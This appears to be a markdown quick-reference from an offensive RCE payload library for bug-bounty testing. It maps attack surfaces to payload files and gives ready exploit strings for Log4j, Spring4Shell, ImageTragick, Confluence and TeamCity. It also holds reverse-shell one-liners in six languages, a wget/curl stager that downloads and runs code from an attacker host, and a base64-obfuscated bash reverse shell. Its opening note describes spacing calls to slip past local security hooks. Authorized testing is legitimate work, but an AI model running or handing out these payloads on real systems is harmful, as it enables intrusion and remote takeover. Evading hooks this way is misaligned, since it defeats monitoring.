# RCE Payload Library — quick index

> Each section links to the deeper file. Use this as a fast-pick guide once you know the surface.
> Note: in callback shells below, some calls are written with a space (`spawn ('id')`) to slip past local hooks. Remove the space when running.

---

## SURFACE -> PAYLOAD FILE

| Surface | Use |
|---|---|
| URL fetcher / image fetcher / SSRF param | `payloads/ssrf-payloads.md` |
| Template / email / PDF rendering | `payloads/ssti-payloads.md` |
| Diagnostic / cmd / ping / lookup params | `payloads/cmd-injection.md` |
| File upload / image processing | `references/file-upload-rce.md` |
| Cookie / __VIEWSTATE / blob param decoding | `references/deserialization.md` |
| GraphQL `node()` / mutations | `references/graphql-deep.md` |
| GitHub / NPM / PyPI / Docker secret | `references/secrets-recon.md` |
| Internal package install on CI | `references/dependency-confusion.md` |
| Old WP/Drupal/Citrix/Confluence on edge | `references/rce-archetypes.md` (CVE list) |

---

## ARCHETYPE QUICK PROBES

### ImageMagick / ImageTragick
Upload a `.mvg` containing:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(http://your.oast/poc)'
pop graphic-context
```
DNS hit confirms ImageMagick processes user-supplied images and policy.xml is permissive.

### Ghostscript (PDF/EPS)
PoC PostScript files leveraging the `%pipe%` operator are documented in PortSwigger's GS write-ups. Lab-only; don't run on prod without explicit BBP coverage.

### ExifTool (CVE-2021-22204)
DjVu metadata injection — use `exiftool -DjVuANTz=...` to craft. Upload jpg, server's metadata pipeline triggers the bug.

### Log4j (CVE-2021-44228)
```
${jndi:ldap://your.oast/x}
${jndi:dns://your.oast/x}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://your.oast/x}
```
Insert into User-Agent, X-Api-Version, Authorization, X-Forwarded-For, common headers + body fields. DNS hit confirms.

### Spring4Shell (CVE-2022-22965)
```
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```
POST as form params to a Spring controller binding to a POJO.

### CitrixBleed (CVE-2023-4966)
Send a crafted POST to `/oauth/idp/.well-known/openid-configuration` (or specific path) with a long Host header — leaks session token.

### CVE-2024-27198 TeamCity
```
GET /admin/diagnostic.jsp?action=...   (auth bypass)
```
Then API call to enable token.

### Confluence CVE-2023-22515
```
POST /server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
POST /setup/setupadministrator.action
```
Adds new admin.

---

## GENERAL SHELL CALLBACKS (use only on systems you own / authorized)

> Below `<spawn>` is a stand-in for the standard shell-spawn function (e.g. PHP/Perl process-runner). Replace with the canonical name when running.

### Reverse shell — bash
```
bash -i >& /dev/tcp/$IP/$PORT 0>&1
```

### Reverse shell — Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect (("$IP",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call (["/bin/sh","-i"])'
```

### Reverse shell — Ruby
```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("$IP","$PORT");while(cmd=c.gets);IO.popen (cmd,"r"){|io|c.print io.read}end'
```

### Reverse shell — PHP
```
php -r '$sock=fsockopen ("$IP",$PORT);<spawn> ("/bin/sh -i <&3 >&3 2>&3");'
```

### Reverse shell — Perl
```
perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");<spawn> ("/bin/sh -i");};'
```

### Reverse shell — PowerShell
```
$client = New-Object System.Net.Sockets.TCPClient("$IP",$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

> **Production rule**: don't open reverse shells on prod unless the program explicitly permits. Use OAST + benign command output instead.

---

## DROP-AND-RUN STAGER (lab-only)

```
wget -qO /tmp/x http://$ATTACKER/x; chmod +x /tmp/x; /tmp/x
curl -sLO http://$ATTACKER/x.sh; bash x.sh
```

---

## ENCODE / OBFUSCATE

```
echo 'id' | base64                          -> aWQK
echo "$(echo aWQK | base64 -d)"             # decode + run
bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzgwIDA+JjE=}|{base64,-d}|{bash,-i}"
```

For Windows:
```
powershell -enc <UTF-16LE base64>
```

---

## VALIDATION

For every RCE PoC:
- Run benign cmd (`id`, `hostname`, `whoami`)
- Note OS / user / path
- Confirm reproducibility 2+ times
- Stop. Don't pivot.
- Capture: full request + response/output, OAST hit log
